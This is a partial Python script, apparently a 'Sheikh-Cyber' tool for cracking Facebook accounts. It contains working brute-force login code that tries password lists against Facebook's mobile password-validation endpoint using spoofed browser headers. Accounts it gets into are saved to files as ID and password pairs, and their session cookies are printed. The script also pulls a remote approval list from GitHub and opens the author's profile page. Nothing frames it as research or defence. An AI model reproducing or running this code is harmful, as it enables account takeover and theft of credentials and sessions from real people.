...
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY SCRIPT PAGE")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/profile.php?id=61551797355201&mibextid=ZbWKwL')
#------------------[ SHEIKH-CYBER ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
princp=[]
try:
    prox= requests.get('https://github.com/Kabir-71/TRICK/blob/main/Approval.txt').text
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/profile.php?id=61551797355201&mibextid=ZbWKwL')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
os.system('espeak -a 300 " Welcome,   to,  sheikh,  cyber,  Tools"')
pass
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Sheikh•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            ses.headers.update({"Host":'m.alpha.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.alpha.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.alpha.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.alpha.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'authority': 'm.alpha.facebook.com',
    'method': 'GET',
    'scheme': 'https',
    ...
    'dpr': '2.75',
    'referer': 'https://m.alpha.facebook.com/bookmarks/',
    ...
    'viewport-width': '980',}
            po = ses.post('https://m.alpha.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Sheikh-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Sheikh-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Sheikh,  Ok,  id"')
...
def crackfree(idf,pwv):
    ...
    'viewport-width': '980',}
            po = ses.post('https://m.alpha.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Sheikh-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Sheikh-Ok] {idf} • {pw} ')
